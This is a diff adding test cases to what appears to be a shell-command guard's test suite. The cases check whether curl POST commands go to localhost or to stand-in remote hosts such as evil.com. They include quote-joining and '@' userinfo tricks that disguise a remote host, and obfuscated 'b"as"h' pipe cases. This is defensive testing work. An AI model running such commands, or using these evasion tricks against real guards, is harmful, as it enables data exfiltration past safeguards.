@@ -502,4 +502,20 @@ unseen "bash -c 'cat x | b\"as\"h'"     "a pipe into a quoted shell inside a pay
 seen   'echo b"as"h'                    "a shell's quoted name as an argument"
 seen   'cat x | grep b"as"h'            "a shell's quoted name as a grep pattern"
 
+# A quote that closes a URL is not part of its host, for every host form (#135).
+allows 'curl -d x "http://localhost"'              "a quoted localhost URL with no path"
+allows "curl -d x 'http://localhost'"              "a single-quoted localhost URL with no path"
+allows 'curl -d x "http://localhost:3000/api"'     "a quoted localhost URL with a port and a path"
+allows 'curl -d x "http://localhost"/api'          "a localhost URL whose quote closes before its path"
+allows 'curl -d x "http://localhost.evil.com".local' "a host the shell joins into a .local name"
+blocks 'curl -d x "http://example.com"'            "a quoted remote URL with no path"
+blocks 'curl -d x "http://localhost.evil.com"'     "a quoted remote name that starts with localhost"
+blocks 'curl -d x "http://localhost"evil.com'      "a host the shell joins past a quote"
+blocks "curl -d x \"http://localhost\"'.evil.com'" "a host the shell joins from two quoted parts"
+blocks 'curl -d x "http://127.0.0.1"evil.com'      "a loopback address the shell joins into a remote name"
+allows 'curl -d x "http://localhost":8080/x'       "a quote that closes before the port"
+allows 'curl -d x "http://127.0.0.1":8080/x'       "a quote that closes a loopback address before the port"
+blocks 'curl -d x "http://localhost":3000@evil.com' "a user before an @ is not the host"
+blocks 'curl -d x "http://127.0.0.1":3000@evil.com' "a loopback user before an @ is not the host"
+
 finish "publish-cmd"
